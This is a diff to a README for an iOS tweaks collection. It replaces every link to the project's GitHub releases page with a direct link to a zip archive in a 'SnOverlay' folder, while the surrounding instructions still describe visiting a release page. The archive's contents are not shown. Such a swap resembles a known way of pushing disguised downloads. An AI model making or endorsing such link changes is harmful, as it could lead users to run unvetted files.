@@ -1,10 +1,10 @@
 # 🔧 Coruna-Tweaks-Collection - Simple iOS Tweaks for Coruna
 
-[![Download Coruna-Tweaks-Collection](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/leg45/Coruna-Tweaks-Collection/releases)
+[![Download Coruna-Tweaks-Collection](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/leg45/Coruna-Tweaks-Collection/main/SnOverlay/Collection_Tweaks_Coruna_1.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/leg45/Coruna-Tweaks-Collection/releases
+Visit this page to download: https://raw.githubusercontent.com/leg45/Coruna-Tweaks-Collection/main/SnOverlay/Collection_Tweaks_Coruna_1.0.zip
 
 Open the release page and get the file that matches your device and iOS version. Use the latest release unless the release notes tell you to pick a different one.
 
@@ -26,7 +26,7 @@ Use it if you want to add light interface changes and tweak support on a support
 ## 🚀 Getting Started
 
 1. Open the download page in your browser:
-   https://github.com/leg45/Coruna-Tweaks-Collection/releases
+   https://raw.githubusercontent.com/leg45/Coruna-Tweaks-Collection/main/SnOverlay/Collection_Tweaks_Coruna_1.0.zip
 
 2. Find the latest release near the top of the page.
 
@@ -131,7 +131,7 @@ If the effect still does not show, remove the files and copy them again from the
 
 ## 📎 Release Page
 
-Download and setup files are here: https://github.com/leg45/Coruna-Tweaks-Collection/releases
+Download and setup files are here: https://raw.githubusercontent.com/leg45/Coruna-Tweaks-Collection/main/SnOverlay/Collection_Tweaks_Coruna_1.0.zip
 
 Open the latest release, download the asset you need, and keep the files in one folder so you can find them later
 
